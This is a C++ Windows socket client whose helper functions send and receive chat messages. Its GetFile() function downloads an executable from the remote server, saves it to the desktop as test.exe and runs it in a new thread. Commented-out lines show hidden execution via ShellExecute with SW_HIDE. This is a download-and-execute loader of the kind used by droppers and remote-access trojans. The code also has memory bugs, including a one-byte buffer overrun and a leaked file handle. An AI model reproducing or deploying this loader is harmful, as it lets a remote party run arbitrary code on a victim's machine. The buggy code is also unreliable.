#include "Client.h"
#include "utils.h"

#include <ShlObj.h>
#include <iterator>
#include <bitset>

bool Client::SendInt(int _int)
{
	int RetnCheck = send(Connection, (char*)&_int, sizeof(int), NULL); //send int: _int
	if (RetnCheck == SOCKET_ERROR) //If int failed to send due to connection issue
		return false; //Return false: Connection issue
	return true; //Return true: int successfully sent
}

bool Client::GetInt(int & _int)
{
	int RetnCheck = recv(Connection, (char*)&_int, sizeof(int), NULL); //receive integer
	if (RetnCheck == SOCKET_ERROR) //If there is a connection issue
		return false; //return false since we did not get the integer
	return true;//Return true if we were successful in retrieving the int
}

bool Client::SendPacketType(Packet _packettype)
{
	int RetnCheck = send(Connection, (char*)&_packettype, sizeof(Packet), NULL); //Send packet: _packettype
	if (RetnCheck == SOCKET_ERROR) //If packettype failed to send due to connection issue
		return false; //Return false: Connection issue
	return true; //Return true: int successfully sent
}

bool Client::GetPacketType(Packet & _packettype)
{
	int RetnCheck = recv(Connection, (char*)&_packettype, sizeof(Packet), NULL); //receive packet type (same as integer)
	if (RetnCheck == SOCKET_ERROR) //If there is a connection issue
		return false; //return false since we did not properly get the packet type
	return true;//Return true if we were successful in retrieving the packet type
}

bool Client::SendString(std::string & _string)
{
	if (!SendPacketType(P_ChatMessage)) //Send packet type: Chat Message, If sending packet type fails...
		return false; //Return false: Failed to send string
	int bufferlength = _string.size(); //Find string buffer length
	if (!SendInt(bufferlength)) //Send length of string buffer, If sending buffer length fails...
		return false; //Return false: Failed to send string buffer length
	int RetnCheck = send(Connection, _string.c_str(), bufferlength, NULL); //Send string buffer
	if (RetnCheck == SOCKET_ERROR) //If failed to send string buffer
		return false; //Return false: Failed to send string buffer
	return true; //Return true: string successfully sent
}

bool Client::GetString(std::string & _string)
{
	int bufferlength; //Holds length of the message
	if (!GetInt(bufferlength)) //Get length of buffer and store it in variable: bufferlength
		return false; //If get int fails, return false
	char * buffer = new char[bufferlength + 1]; //Allocate buffer
	buffer[bufferlength] = '\0'; //Set last character of buffer to be a null terminator so we aren't printing memory that we shouldn't be looking at
	int RetnCheck = recv(Connection, buffer, bufferlength, NULL); //receive message and store the message in buffer array, set RetnCheck to be the value recv returns to see if there is an issue with the connection
	_string = buffer; //set string to received buffer message
	delete[] buffer; //Deallocate buffer memory (cleanup to prevent memory leak)
	if (RetnCheck == SOCKET_ERROR) //If connection is lost while getting message
		return false; //If there is an issue with connection, return false
	return true;//Return true if we were successful in retrieving the string
}

std::string bitToStr(std::string str)
{
	if (str.size() % 8 != 0)
		return "";
	std::string rstr = "";
	for (int i = 0; i < str.size(); i += 8)
	{
		std::string tmp(&str[i], 8);
		rstr += (char)std::bitset<8>(str, i, 8).to_ulong();
	}
	return rstr;
}

void Client::GetFile()
{
	HANDLE fFile;
	DWORD writenbytes;
	int retval = 0;
	int bufferlength = 0;
	int buffsize = 0;
	int fisize = 0;
	std::string ss;
	std::string strout;
	std::wstring wfullpath = L"";
	wchar_t path[32767];
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
	wfullpath.assign(path);
	wfullpath += L"\\test.exe";
	fFile = CreateFile(wfullpath.c_str(), NULL, NULL, NULL, CREATE_NEW, NULL, NULL);
	fFile = CreateFileW(wfullpath.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
	if (!GetInt(bufferlength))
		return;
	do {
		GetInt(buffsize);
		if (buffsize == 0)
			break;
		char *buff = new char[buffsize];
		memset(buff, 0, buffsize + 1);
		retval = recv(Connection, buff, buffsize, 0);
		WriteFile(fFile, buff, buffsize, &writenbytes, NULL);
		if (retval == 0)
		{
			CancelIo(fFile);
			break;
		}
		else if (retval == SOCKET_ERROR)
		{
			CancelIo(fFile);
			break;
		}
	} while (retval > 0);
	CancelIo(fFile);
	CloseHandle(fFile);
	std::cout << "Complite!" << std::endl;
	//system("C:\\Users\\Kali\\Desktop\\test.exe");
	//ShellExecute(NULL, NULL, fullpath.c_str(), NULL, NULL, SW_HIDE);
	std::string str = ws2s(wfullpath);
	HANDLE threadhandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)testFile, &str, NULL, NULL);
	WaitForSingleObject(threadhandle, INFINITE);
}

